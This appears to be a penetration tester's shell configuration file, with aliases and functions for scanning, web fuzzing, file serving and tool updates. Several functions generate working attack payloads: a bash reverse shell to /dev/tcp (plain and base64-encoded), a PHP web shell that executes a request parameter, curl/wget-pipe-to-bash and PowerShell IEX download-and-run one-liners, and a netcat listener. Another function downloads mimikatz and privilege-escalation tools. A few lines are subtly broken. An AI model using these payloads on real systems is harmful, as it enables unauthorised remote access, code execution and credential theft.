#!/bin/sh
unalias -m rm
unalias -m dig

alias burpsuite="burpsuite &"
alias ff="firefox > /dev/null 2> /dev/null &"
alias zaproxy="zaproxy > /dev/null 2> /dev/null &"
alias sp="searchsploit"
alias eh="sudoedit /etc/hosts"
alias sshgen="ssh-keygen -f id_rsa -P ''"
alias show_commands="cat $HOME/.config/commands.txt"
alias e="/home/kali/.local/bin/lvim"
alias f="ranger"
alias history="history 0"
alias ls="lsd"
alias lsa="ls -la"

edit_command() {
  tmp_file="$(mktemp)"
  [ ! -t 0 ] && while read -r line; do echo "$line" >> "$tmp_file"; done
  $EDITOR "$tmp_file"
  [ ! "$?" = "0" ] && echo "Aborting...Command will not be executed." && rm "$tmp_file" && return
  echo "Executing:"
  cat "$tmp_file"
  . "$tmp_file"
  rm "$tmp_file"
}

edit_history() {
  sel="$(history 0 | sort -r | fzf | awk '{ print $1 }')"
  [ "$sel" = "" ] && echo "Nothing selected." && return
  fc "$sel"
}

copy_file() {
  dest="$1"
  [ "$1" = "" ] && dest="$(pwd)"
  files="$({ find /opt/external -type f; cat "$HOME/.config/files.txt"; } | fzf -m)"
  echo "$files" | while read -r f; do
    file_name="$(basename "$f")"
    cp "$f" "$dest/$file_name"
    echo "$f copied to $dest/$file_name"
  done
}

interfaceip() {
  interfaces="$(ip -4 -o addr | awk '{print sprintf("%s %s", $2, $4)}')"
  wlan="$(echo "$interfaces" | grep -i "wlp")"
  enp="$(echo "$interfaces" | grep -i "enp")"
  tun="$(echo "$interfaces" | grep -i "tun")"
  [ "$wlan" != "" ] && address="$(echo "$wlan" | cut -d " " -f 2 | cut -d "/" -f 1)"
  [ "$enp" != "" ] && address="$(echo "$enp" | cut -d " " -f 2 | cut -d "/" -f 1)"
  [ "$tun" != "" ] && address="$(echo "$tun" | cut -d " " -f 2 | cut -d "/" -f 1)"
  echo "$address"
}

dl_curr() {
  [ "$1" = "" ] && echo "Usage: dl_curr <win/lin> <port>" && return
  port="8000"
  [ "$2" != "" ] && port="$2"
  address="$(interfaceip)"
  find . -type f | cut -c 3- | while read -r f; do
    file_name="$(basename "$f")"
    echo "#### $f ####"
    if [ "$1" = "win" ]; then
      echo "certutil -urlcache -split -f \"http://$address:$port/$f\" $file_name"
      echo "powershell -c \"(new-object System.Net.WebClient).DownloadFile('http://$address:$port/$f','$file_name')\""
      echo "powershell -c \"wget 'http://$address:$port/$f' -outfile $file_name\" -UseBasicParsing"
      echo "powershell IEX (New-Object Net.WebClient).DownloadString(\'http://$address:$port/$f\')"
      echo "curl \"http://$address:$port/$f\" --output $file_name"
    fi
    if [ "$1" = "lin" ]; then
      echo "wget \"http://$address:$port/$f\""
      echo "wget -qO- \"http://$address:$port/$f\" | bash"
      echo "curl \"http://$address:$port/$f\" | bash"
    fi
    echo ""
  done
}

dl_curr_sel() {
  plattform="$(echo 'win\nlin' | fzf --prompt="Select plattform")"
  [ "$plattform" = "" ] && echo "Please specify Plattform." && return
  sel="$(dl_curr "$plattform" "$1" | fzf)"
  echo "Selected and copied to clipboard:"
  echo "$sel"
  echo "$sel" | xclip -selection clipboard
}

ncl() {
  port="5555"
  [ "$1" != "" ] && port="$1"
  sudo nc -nlvp "$port"
}

phpwebsh() {
  printf "%s\n%s\n%s\n%s\n" '<?php' '$output = shell_exec($_REQUEST["cmd"]);' 'echo "<pre>$output</pre>";' '?>'
  echo "Copied to clipboard."
  printf "%s\n%s\n%s\n%s\n" '<?php' '$output = shell_exec($_REQUEST["cmd"]);' 'echo "<pre>$output</pre>";' '?>' | xclip -selection clipboard
}

bashrev() {
  port="5555"
  [ "$1" != "" ] && port="$1"
  address="$(interfaceip)"
  echo "Payload:"
  echo "bash -i >& /dev/tcp/$address/$port 0>&1"
  b64="$(echo "bash -i >& /dev/tcp/$address/$port 0>&1" | base64)"
  echo "Payload (base64 encoded):"
  echo "echo '$b64' | base64 -d | bash"
}

portscan() {
  [ "$1" = "" ] && echo "Usage: portscan <ip>" && return
  echo "Executing and copied to clipboard:"
  echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan"
  echo "mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan" | xclip -selection clipboard
  mkdir -p nmap-$1 && rustscan -a "$1" -- -A -sC -sV -sS -sU --osscan-guess --version-all -oA nmap-$1/fullscan
}

ni() {
  [ "$3" = "" ] && echo "Usage: ni <http/https> <domain/ip> <port>" && return
  echo "Executing and copied to clipboard:"
  echo "nikto -ask=no -h "$1://$2:$3" | tee nikto-$1-$2-$3.txt"
  echo "nikto -ask=no -h "$1://$2:$3" | tee nikto-$1-$2-$3.txt" | xclip -selection clipboard
  nikto -ask=no -h "$1://$2:$3" | tee nikto-$1-$2-$3.txt
}

er() {
  export rhost="$1"
  echo "rhost is $rhost"
}

ffuf_web() {
  [ "$3" = "" ] && echo "Usage: ffuf_web <http/https> <domain/ip> <port>" && return
  ffuf_out="ffuf-$1-$2-$3"
  echo "Executing and copied to clipboard:"
  echo "ffuf -c -u "$1://$2:$3/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "$ffuf_out/summary.txt" -recursion -e ".htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp" -od "$ffuf_out" -mc "200,204,301,302,307,401,405,403""
  echo "ffuf -c -u "$1://$2:$3/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "$ffuf_out/summary.txt" -recursion -e ".htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp" -od "$ffuf_out" -mc "200,204,301,302,307,401,405,403"" | xclip -selection clipboard
  ffuf -c -u "$1://$2:$3/FUZZ" -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt -o "$ffuf_out/summary.txt" -recursion -e ".htm,.py,.sh,.php,.txt,.md,.html,.asp,.aspx,.jsp" -od "$ffuf_out" -mc "200,204,301,302,307,401,405,403"
}

ffuf_vhost() {
  [ "$3" = "" ] && echo "Usage: ffuf_vhost <http/https> <domain> <port> <filter_size>" && return
  [ "$4" = "" ] && 4="99999999"
  ffuf_out="ffuf-vhost-$1-$2-$3"
  echo "Executing and copied to clipboard:"
  echo "ffuf -c -u "$1://$2:$3" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o "$ffuf_out/summary.txt" -od "$ffuf_out" -H "Host: FUZZ.$2" -fs $4"
  echo "ffuf -c -u "$1://$2:$3" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o "$ffuf_out/summary.txt" -od "$ffuf_out" -H "Host: FUZZ.$2" -fs $4" | xclip -selection clipboard
  ffuf -c -u "$1://$2:$3" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -o "$ffuf_out/summary.txt" -od "$ffuf_out" -H "Host: FUZZ.$2" -fs $4
}

vnc_start() {
  echo "Starting vnc"
  (x11vnc -nopw -N -forever -env FD_PROG=startxfce4 -create \
      -gone 'killall Xvfb' -env X11VNC_CREATE_GEOM="${1:-1024x1080x24}" \
      -env X11VNC_FINDDISPLAY_ALWAYS_FAILS=1 > /dev/null 2>&1 &)
  (/usr/share/novnc/utils/launch.sh > /dev/null 2>&1 &)
  echo "Visit http://kali-docker:6080/vnc.html"
}

vnc_stop() {
  echo "Stopping vnc"
  (pkill websockify > /dev/null 2>&1)
  (pkill x11vnc > /dev/null 2>&1)
}

share() {
  ip -4 -o addr | awk '{print sprintf("%s %s", $2, $4)}' && updog -d "$PWD"
}

urlencode() {
  [ "$1" != "" ] && python3 -c "import sys, urllib.parse as ul; print (ul.quote_plus(sys.argv[1]))" "$1"
}

urldecode() {
  [ "$1" != "" ] && python3 -c "import sys, urllib.parse as ul; print(ul.unquote_plus(sys.argv[1]))" "$1"
}

update_external_tools() {
  wget -O /tmp/chisel_linux64.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_linux_amd64')" && gunzip /tmp/chisel_linux64.gz && mv /tmp/chisel_linux64 /opt/external && \
  wget -O /tmp/chisel_linux86.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_linux_386')" && gunzip /tmp/chisel_linux86.gz && mv /tmp/chisel_linux86 /opt/external && \
  wget -O /tmp/chisel_win64.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_windows_amd64')" && gunzip /tmp/chisel_win64.gz && mv /tmp/chisel_win64 /opt/external/chisel_win64.exe && \
  wget -O /tmp/chisel_win86.gz "$(curl -s https://api.github.com/repos/jpillora/chisel/releases/latest | jq -r '.assets[].browser_download_url' | grep 'chisel_.*_windows_386')" && gunzip /tmp/chisel_win86.gz && mv /tmp/chisel_win86 /opt/external/chisel_win86.exe && \
  wget -O /opt/external/pspy32 "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy32$')" && \
  wget -O /opt/external/pspy32s "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy32s')" && \
  wget -O /opt/external/pspy64 "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy64$')" && \
  wget -O /opt/external/pspy64s "$(curl -s https://api.github.com/repos/DominicBreuker/pspy/releases/latest | jq -r '.assets[].browser_download_url' | grep 'pspy64s')" && \
  wget -O /opt/external/linpeas.sh "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'linpeas.sh')" && \
  wget -O /opt/external/linpeas_linux_386 "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'linpeas_linux_386')" && \
  wget -O /opt/external/linpeas_linux_amd64 "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'linpeas_linux_amd64')" && \
  wget -O /opt/external/winPEAS.bat "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEAS.bat')" && \
  wget -O /opt/external/winPEASany.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASany.exe')" && \
  wget -O /opt/external/winPEASany_ofs.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASany_ofs.exe')" && \
  wget -O /opt/external/winPEASx64.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx64.exe')" && \
  wget -O /opt/external/winPEASx64_ofs.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx64_ofs.exe')" && \
  wget -O /opt/external/winPEASx86.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx86.exe')" && \
  wget -O /opt/external/winPEASx86_ofs.exe "$(curl -s https://api.github.com/repos/carlospolop/PEASS-ng/releases/latest | jq -r '.assets[].browser_download_url' | grep 'winPEASx86_ofs.exe')" && \
  wget -O /tmp/sysint.zip 'https://download.sysinternals.com/files/SysinternalsSuite.zip' && unzip /tmp/sysint.zip -d /opt/external && rm /opt/external/*.chm /opt/external/*.txt /tmp/sysint.zip && \
  mkdir /tmp/mimi && wget -O /tmp/mimi/mimikatz.zip "$(curl -s https://api.github.com/repos/gentilkiwi/mimikatz/releases/latest | jq -r '.assets[].browser_download_url' | grep 'mimikatz_.*.zip')" && \
  unzip /tmp/mimi/mimikatz.zip && cp /tmp/mimi/Win32/mimikatz.exe /opt/external/mimikatz32.exe && cp /tmp/mimi/Win32/mimilove.exe /opt/external/mimilove.exe && cp /tmp/mimi/x64/mimikatz.exe /opt/external/mimikatz64.exe && rm -rf /tmp/mimi && \
  wget -O /opt/external/traitor-386 "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep 'traitor-386')" && \
  wget -O /opt/external/traitor-amd64 "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep 'traitor-amd64')" && \
  wget -O /opt/external/SharpWeb.exe "$(curl -s https://api.github.com/repos/liamg/traitor/releases/latest | jq -r '.assets[].browser_download_url' | grep '.*.exe')" && \
  mkdir -p /opt/external/SharpCollection && git clone https://github.com/Flangvik/SharpCollection /opt/external/SharpCollection

}

update_repos() {
  echo "TODO"
}
